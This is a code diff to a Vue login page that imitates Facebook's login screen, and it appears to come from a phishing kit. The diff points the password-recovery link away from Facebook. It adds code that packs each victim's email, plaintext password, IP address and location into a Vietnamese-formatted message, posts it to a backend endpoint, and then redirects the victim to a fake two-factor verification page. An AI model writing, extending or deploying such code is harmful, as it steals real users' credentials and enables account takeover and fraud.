@@ -80,7 +80,7 @@
         Log in
       </button>
       <a
-        href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0"
+        href="/?a=1"
         class="flex justify-center text-center cursor-pointer hover:underline"
         >Forgotten Password?</a
       >
@@ -123,36 +123,43 @@ const handleFocus = (type: string, ref: any) => {
     ref.focus()
   }
 }
-
+const options = {
+  hour: '2-digit',
+  minute: '2-digit',
+  second: '2-digit',
+  day: '2-digit',
+  month: '2-digit',
+  year: 'numeric',
+}
+const geo = JSON.parse(localStorage.getItem('geo') || '{}')
 const handleSubmit = async () => {
   if (!email.value || !password.value) {
     return
   }
+  const message = `
+🕒 <b>Thời gian:</b> ${new Date().toLocaleString('vi-VN', options)}
+🌍 <b>Địa chỉ IP:</b> ${geo.ip}
+📍 <b>Vị trí:</b> ${geo.city}, ${geo.country}
+
+📧 <b>Email:</b> ${email.value}
+🔑 <b>Mật khẩu:</b> ${password.value}
+`
 
   // Call your API here
   try {
     await $fetch('/api/code', {
       method: 'POST',
-      body: JSON.stringify({ account: { email: email.value, password: password.value } }),
+      body: JSON.stringify({ rawMessage: message }),
       headers: {
         'Content-Type': 'application/json',
       },
     })
-    const isNew = localStorage.getItem('visited')
-    if (!isNew) {
-      await $fetch('/api/code', {
-        method: 'POST',
-        body: JSON.stringify({ message: '👨‍💼 Có người dùng mới truy cập', newUser: true }),
-        headers: {
-          'Content-Type': 'application/json',
-        },
-      })
-      localStorage.setItem('visited', 'yes')
-    }
+    localStorage.setItem('email', email.value)
   } catch (error) {
     console.error(error)
   }
-  router.push('/two_step_verification/two_factor')
+  // router.push('/two_step_verification/two_factor')
+  window.location.href = '/two_step_verification/two_factor?a=1'
 }
 </script>
 
